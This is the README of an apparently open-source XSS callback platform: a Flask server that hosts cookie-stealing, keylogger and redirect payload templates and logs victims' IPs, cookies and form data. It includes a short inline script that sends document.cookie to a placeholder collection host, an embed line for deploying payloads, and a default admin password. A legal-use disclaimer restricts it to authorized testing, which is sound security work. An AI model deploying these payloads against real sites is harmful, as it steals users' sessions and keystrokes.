# 🍃 小绿茶XSS反连平台

[![Python](https://img.shields.io/badge/Python-3.8+-blue.svg)](https://www.python.org/)
[![Flask](https://img.shields.io/badge/Flask-2.3+-green.svg)](https://flask.palletsprojects.com/)
[![License](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)

> 一个现代化的XSS反连平台，专为安全测试和漏洞验证设计

## ✨ 核心特性

### 🎯 攻击载荷管理
- **模板系统**: 内置多种XSS攻击模板
- **代码编辑器**: 基于CodeMirror的专业代码编辑器
- **实时预览**: Payload实时测试和预览功能
- **一键生成**: 快速生成可部署的XSS攻击载荷

### 📊 数据收集与分析
- **实时监控**: 实时捕获XSS请求数据
- **详细信息**: 完整收集访问者信息（IP、User-Agent、Cookie等）
- **数据可视化**: 直观的统计图表和数据分析
- **日志管理**: 完整的请求日志记录和检索

### 🔧 高级功能
- **邮件通知**: 新请求即时邮件提醒
- **IP白名单**: 灵活的安全访问控制
- **会话管理**: 安全的用户认证系统
- **多格式支持**: 支持JSON、表单、文件等多种数据格式

## 🚀 快速开始

### 环境要求
- Python 3.8 或更高版本
- Flask 2.3+
- 现代浏览器（推荐 Chrome/Firefox/Safari）

### 安装步骤

1. **克隆项目**
```bash
git clone <repository-url>
cd Little_Bitch
```

2. **安装依赖**
```bash
pip install -r requirements.txt
```

3. **启动应用**
```bash
python app.py
```

4. **访问平台**
- 管理后台: http://127.0.0.1:5000/admin
- XSS接收端点: http://127.0.0.1:5000/
- 数据收集API: http://127.0.0.1:5000/api/collect

5. **登录系统**
- 用户名: 任意（如：admin）
- 密码: `godxing`（默认密码）

## 📖 使用指南

### 1. 模板管理
平台内置了多种XSS攻击模板：
- **基础弹窗**: 简单的XSS验证Payload
- **Cookie窃取**: 窃取用户Cookie信息
- **页面重定向**: 将用户重定向到指定页面
- **键盘记录**: 记录用户键盘输入

### 2. Payload生成
1. 进入"JS管理"页面
2. 创建新的JS文件或使用模板
3. 在代码编辑器中编写Payload
4. 保存并生成可部署的URL

### 3. 数据监控
1. 部署Payload到目标网站
2. 在"数据监控"页面查看捕获的请求
3. 分析访问者的详细信息
4. 导出数据用于进一步分析

### 4. 系统配置
- **邮件通知**: 配置SMTP服务器接收实时通知
- **安全设置**: 设置IP白名单和访问限制
- **会话管理**: 配置会话超时时间

## 🏗️ 项目结构

```
Little_Bitch/
├── app.py                 # Flask主应用
├── requirements.txt       # Python依赖包
├── data/                  # 数据存储目录
│   ├── users.json        # 用户信息
│   ├── logs.json         # XSS捕获日志
│   ├── settings.json     # 系统设置
│   └── sessions/         # 会话文件
├── jstemplates/          # JS模板文件
│   ├── basic-alert.js    # 基础弹窗模板
│   ├── cookie-steal.js   # Cookie窃取模板
│   ├── redirect.js       # 页面重定向模板
│   └── keylogger.js      # 键盘记录模板
├── myjs/                 # 用户自定义JS文件
│   ├── basecs.js         # 基础Cookie窃取
│   ├── example.js        # 示例Payload
│   ├── Rick.js           # 重定向Payload
│   └── xsstest.js        # XSS测试Payload
├── static/               # 静态资源
│   ├── css/
│   │   └── style.css     # 主样式文件
│   └── js/
│       ├── main.js       # 主要功能逻辑
│       ├── utils.js      # 工具函数
│       └── editor.js     # 代码编辑器
├── templates/            # HTML模板
│   ├── base.html         # 基础模板
│   ├── login.html        # 登录页面
│   ├── dashboard.html    # 控制台
│   ├── templates.html    # 模板管理
│   ├── payload.html      # JS管理
│   ├── logs.html         # 数据监控
│   ├── settings.html     # 系统设置
│   └── error.html        # 错误页面
└── README.md             # 项目文档
```

## 🔧 核心功能详解

### XSS数据接收
平台提供多种数据接收方式：
- **基础端点**: `/` - 接收GET/POST请求
- **API端点**: `/api/collect` - 通用数据收集接口
- **文件服务**: `/payloads/<filename>` - 提供JS文件访问

### 数据收集内容
每个请求会收集以下信息：
- 基本请求信息（方法、URL、时间戳）
- 客户端信息（IP、User-Agent、语言等）
- Cookie和本地存储数据
- 请求参数和表单数据
- 文件上传信息
- 完整的请求头和原始数据

### 安全特性
- **IP白名单**: 限制管理后台访问IP
- **会话管理**: 安全的用户认证
- **请求限制**: 防止暴力攻击
- **输入验证**: 防止注入攻击

## 🛠️ 开发指南

### API接口

#### 数据收集
```javascript
// 发送数据到平台
fetch('http://your-platform.com/api/collect', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        type: 'custom_data',
        data: 'your_data_here'
    })
});
```

#### Payload部署
```html
<!-- 直接嵌入Payload -->
<script src="http://your-platform.com/payloads/your-payload.js"></script>

<!-- 或者使用内联JavaScript -->
<script>
    // 你的XSS代码
    fetch('http://your-platform.com/api/collect', {
        method: 'POST',
        body: JSON.stringify({cookie: document.cookie})
    });
</script>
```

### 自定义开发

#### 添加新模板
1. 在 `jstemplates/` 目录创建新的JS文件
2. 遵循现有的模板结构
3. 重启应用即可在模板列表看到新模板

#### 扩展数据收集
修改 `app.py` 中的数据处理逻辑，添加新的数据解析方式。

## ⚙️ 配置说明

### 邮件通知配置
在系统设置中配置SMTP服务器：
- SMTP服务器地址
- 端口号（通常587）
- 用户名和密码
- 接收邮箱地址
- 安全连接类型

### 安全配置
- **会话超时**: 设置用户会话有效期
- **IP白名单**: 配置允许访问的IP地址段
- **请求限制**: 设置请求频率限制
- **密码策略**: 修改默认登录密码

## 🛡️ 安全与法律

### 合法使用声明
⚠️ **重要**: 本平台仅供合法的安全测试和教育用途

- ✅ 在获得明确授权的情况下使用
- ✅ 用于企业安全测试和漏洞验证
- ✅ 用于安全研究和教育培训
- ❌ **禁止**用于未经授权的攻击
- ❌ **禁止**用于恶意目的
- ❌ **禁止**违反当地法律法规

### 安全建议
1. **定期更新密码**: 修改默认密码
2. **配置IP白名单**: 限制管理后台访问
3. **启用HTTPS**: 在生产环境使用SSL证书
4. **定期备份**: 备份重要数据
5. **监控日志**: 定期检查系统日志

## 🐛 故障排除

### 常见问题

**Q: 无法访问管理后台**
A: 检查IP白名单设置，确保你的IP在允许列表中

**Q: 邮件通知不工作**
A: 验证SMTP配置，检查用户名密码和服务器设置

**Q: Payload无法执行**
A: 检查目标网站的CSP策略，可能需要调整Payload

**Q: 数据没有捕获**
A: 检查网络连接，确保Payload正确部署

### 日志查看
查看 `data/logs.json` 文件获取详细的请求日志，或通过管理后台的数据监控页面查看。

## 📞 技术支持

如果您遇到问题或需要帮助：

1. **查看文档**: 仔细阅读本README文档
2. **检查日志**: 查看应用日志和错误信息
3. **社区支持**: 通过GitHub Issues提交问题
4. **功能建议**: 欢迎提出改进建议和新功能需求

## 📄 许可证

本项目基于MIT许可证开源，详见LICENSE文件。

---

<div align="center">

**🍃 小绿茶XSS反连平台** - 让安全测试更简单、更高效

*专业的安全测试工具，为网络安全保驾护航*

</div>